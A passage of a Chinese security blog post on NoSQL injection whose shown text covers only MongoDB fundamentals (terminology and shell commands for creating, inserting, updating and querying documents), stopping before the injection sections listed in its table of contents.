<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="N0sql No only SQL,目前最流行的nosql产品是MongoDB 一种数据结构由键值对组成的文档">
<meta property="og:type" content="article">
<meta property="og:title" content="Nosql注入">
<meta property="og:url" content="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="N0sql No only SQL,目前最流行的nosql产品是MongoDB 一种数据结构由键值对组成的文档">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png">
<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161641-79e9c82a-ec57-1.png">
<meta property="article:published_time" content="2025-07-01T02:35:37.000Z">
<meta property="article:modified_time" content="2025-07-01T05:28:10.226Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web -SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/20210724161640-790ad458-ec57-1.png">


<link rel="canonical" href="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/","path":"2025/07/01/Nosql注入/","title":"Nosql注入"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Nosql注入 | Blog of AyaN0</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">
      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Blog of AyaN0</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#n0sql"><span class="nav-number">1.</span> <span class="nav-text"> N0sql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mongodb-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E8%A7%A3%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text"> MongoDB 基础概念解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93database"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 数据库（Database）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E6%A1%A3document"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 文档（Document）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9B%86%E5%90%88collection"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 集合（Collection）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mongodb%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C"><span class="nav-number">1.2.</span> <span class="nav-text"> MongoDB基础操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">1.2.1.</span> <span class="nav-text"> 创建数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%9B%86%E5%90%88"><span class="nav-number">1.2.2.</span> <span class="nav-text"> 创建集合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E6%96%87%E6%A1%A3"><span class="nav-number">1.2.3.</span> <span class="nav-text"> 插入文档</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9B%B4%E6%96%B0%E6%96%87%E6%A1%A3"><span class="nav-number">1.2.4.</span> <span class="nav-text"> 更新文档</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%87%E6%A1%A3"><span class="nav-number">1.2.5.</span> <span class="nav-text"> 查询文档</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mongodb-%E4%B8%8E-rdbms-%E4%B9%8B%E9%97%B4%E7%9A%84%E7%B1%BB%E6%AF%94%E6%AF%94%E8%BE%83"><span class="nav-number">1.2.5.1.</span> <span class="nav-text"> MongoDB 与 RDBMS 之间的类比比较</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E5%88%B0"><span class="nav-number">1.3.</span> <span class="nav-text"> 注入时间到</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%B8%AD%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text"> PHP中的注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.1.</span> <span class="nav-text"> 重言式注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.2.</span> <span class="nav-text"> 联合查询注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.3.</span> <span class="nav-text"> js注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#where-%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="nav-number">1.3.1.3.1.</span> <span class="nav-text"> $where 操作符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#commmand%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.3.2.</span> <span class="nav-text"> commmand方法注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#execute%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.1.3.3.</span> <span class="nav-text"> execute方法注入</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.3.1.4.</span> <span class="nav-text"> 布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nodejs%E4%B8%AD%E7%9A%84mongodb%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.2.</span> <span class="nav-text"> Nodejs中的MongoDB注入</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="AyaN0"
      src="/images/lly.jpg">
  <p class="site-author-name" itemprop="name">AyaN0</p>
  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">28</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lly.jpg">
      <meta itemprop="name" content="AyaN0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog of AyaN0">
      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Nosql注入 | Blog of AyaN0">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Nosql注入
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-07-01 10:35:37 / 修改时间：13:28:10" itemprop="dateCreated datePublished" datetime="2025-07-01T10:35:37+08:00">2025-07-01</time>
    </span>

  
    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">阅读次数：</span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>25k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>45 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="n0sql"><a class="markdownIt-Anchor" href="#n0sql"></a> N0sql</h1>
<p>No only SQL,目前最流行的nosql产品是MongoDB</p>
<p>一种数据结构由键值对组成的文档</p>
<p>和json类似</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
    <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> ObjectId(<span class="string">&quot;60fa854cf8aaaf4f21049148&quot;</span>)<span class="punctuation">,</span>
    <span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;whoami&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;description&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;the admin user&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;age&quot;</span> <span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span>
    <span class="attr">&quot;status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;groups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span>
        <span class="string">&quot;admins&quot;</span><span class="punctuation">,</span>
        <span class="string">&quot;users&quot;</span>
    <span class="punctuation">]</span>
<span class="punctuation">&#125;</span></code></pre>
<h2 id="mongodb-基础概念解析"><a class="markdownIt-Anchor" href="#mongodb-基础概念解析"></a> MongoDB 基础概念解析</h2>
<p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p>
<table>
<thead>
<tr>
<th>SQL 概念</th>
<th>MongoDB 概念</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表/集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行/文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段/域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接，MongoDB 不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td>
</tr>
</tbody>
</table>
<p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p>
<table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>数据库</td>
<td>数据库</td>
</tr>
<tr>
<td>表格</td>
<td>集合</td>
</tr>
<tr>
<td>行</td>
<td>文档</td>
</tr>
<tr>
<td>列</td>
<td>字段</td>
</tr>
<tr>
<td>表联合</td>
<td>嵌入文档</td>
</tr>
<tr>
<td>主键</td>
<td>主键（MongoDB 提供了 key 为 _id）</td>
</tr>
</tbody>
</table>
<h3 id="数据库database"><a class="markdownIt-Anchor" href="#数据库database"></a> 数据库（Database）</h3>
<p>个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<p>使用 <code>show dbs</code> 命令可以显示所有数据库的列表：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
&gt;</code></pre>
<p>执行 <code>db</code> 命令可以显示当前数据库对象或集合：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt;</code></pre>
<h3 id="文档document"><a class="markdownIt-Anchor" href="#文档document"></a> 文档（Document）</h3>
<p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
<p>一个简单的文档例子如下：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</code></pre>
<h3 id="集合collection"><a class="markdownIt-Anchor" href="#集合collection"></a> 集合（Collection）</h3>
<p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
<p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;
&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;
&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</code></pre>
<p>当插入一个文档时，集合就会被自动创建。</p>
<p>如果我们要查看已有集合，可以使用 <code>show collections</code> 或 <code>show tables</code> 命令：</p>
<pre><code class="highlight plaintext">&gt; show collections
all_users
&gt; show tables
all_users
&gt;</code></pre>
<h2 id="mongodb基础操作"><a class="markdownIt-Anchor" href="#mongodb基础操作"></a> MongoDB基础操作</h2>
<h3 id="创建数据库"><a class="markdownIt-Anchor" href="#创建数据库"></a> 创建数据库</h3>
<pre><code class="highlight plaintext">use DATABASENAME</code></pre>
<p>一键创建；若已存在就连接并切换到指定数据库</p>
<h3 id="创建集合"><a class="markdownIt-Anchor" href="#创建集合"></a> 创建集合</h3>
<pre><code class="highlight plaintext">db.createCollection(name,options)</code></pre>
<ul>
<li>name：要创建的集合名称</li>
<li>options：可选参数，指定有关内存大小及索引的选项</li>
</ul>
<p>如下实例，我们在 users 数据库中创建一个 all_users 集合：</p>
<pre><code class="highlight plaintext">&gt; use users
switched to db users
&gt; db.createCollection(&quot;all_users&quot;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;</code></pre>
<h3 id="插入文档"><a class="markdownIt-Anchor" href="#插入文档"></a> 插入文档</h3>
<pre><code class="highlight plaintext">db.COLLECTION_NAME.insert(document)</code></pre>
<p>如下实例，我们向存储在 users 数据库的 all_users 集合中插入一个文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.insert(&#123;name: &#x27;whoami&#x27;, 
    description: &#x27;the admin user&#x27;,
    age: 19,
    status: &#x27;A&#x27;,
    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]
&#125;)</code></pre>
<p>我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入。</p>
<h3 id="更新文档"><a class="markdownIt-Anchor" href="#更新文档"></a> 更新文档</h3>
<p>在 MongoDB 中我们可以使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档。</p>
<ul>
<li><strong>update() 方法</strong></li>
</ul>
<p>update() 方法用于更新已存在的文档。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   &#123;
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>
<p>参数说明：</p>
<ul>
<li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li>
<li>update：update 操作的对象和一些更新的操作符（如 <code>$set</code>）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li>
<li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li>
</ul>
<p>接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:19&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)
&gt;
&gt; db.all_users.find().pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>
<p>成功将 age 从 19 改为了 20。</p>
<p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:&#x27;19&#x27;&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;, &#123;multi:true&#125;)</code></pre>
<ul>
<li><strong>save() 方法</strong></li>
</ul>
<p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.save(
   &lt;document&gt;,
   &#123;
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>
<p>参数说明：</p>
<ul>
<li>document：文档数据。</li>
</ul>
<p>如下实例中我们替换了 <code>_id</code> 为 60fa854cf8aaaf4f21049148 的文档数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.save(&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 21,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;)</code></pre>
<h3 id="查询文档"><a class="markdownIt-Anchor" href="#查询文档"></a> 查询文档</h3>
<pre><code class="highlight plaintext">db.collection.find(query,projection)</code></pre>
<p>参数说明：</p>
<ul>
<li>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。</li>
<li>projection：可选，使用投影操作符指定返回的键。</li>
</ul>
<p>如下实例我们查询了集合 all_users 中的 age 为 20 的数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&quot;20&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : &quot;20&quot;, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<p>如果你需要以易读的方式来读取数据，可以使用 <code>pretty()</code> 方法以格式化的方式来显示所有文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>
<h4 id="mongodb-与-rdbms-之间的类比比较"><a class="markdownIt-Anchor" href="#mongodb-与-rdbms-之间的类比比较"></a> MongoDB 与 RDBMS 之间的类比比较</h4>
<p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS 中的类似语句</th>
</tr>
</thead>
<tbody>
<tr>
<td>等于</td>
<td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td>
<td><code>where name = 'whoami'</code></td>
</tr>
<tr>
<td>小于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td>
<td><code>where age &lt; 19</code></td>
</tr>
<tr>
<td>小于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &lt;= 19</code></td>
</tr>
<tr>
<td>大于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt; 19</code></td>
</tr>
<tr>
<td>大于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt;= 19</code></td>
</tr>
<tr>
<td>不等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td>
<td><code>where likes != 19</code></td>
</tr>
</tbody>
</table>
<p>而查询时的<strong>AND语句</strong>的表示即用<code>,</code>隔开多个键值对</p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;status&quot;:&quot;B&quot;, &quot;age&quot;:20&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ef8f8aaaf4f2104914e&quot;), &quot;name&quot; : &quot;bob&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;B&quot;, &quot;groups&quot; : [ &quot;normals&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>
<p>以上实例中类似于 RDBMS 中的 WHERE 语句：<code>WHERE status='B' AND age=20</code></p>
<p>查询时的<strong>OR语句</strong>要在开头加上<code>$or</code></p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()</code></pre>
<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
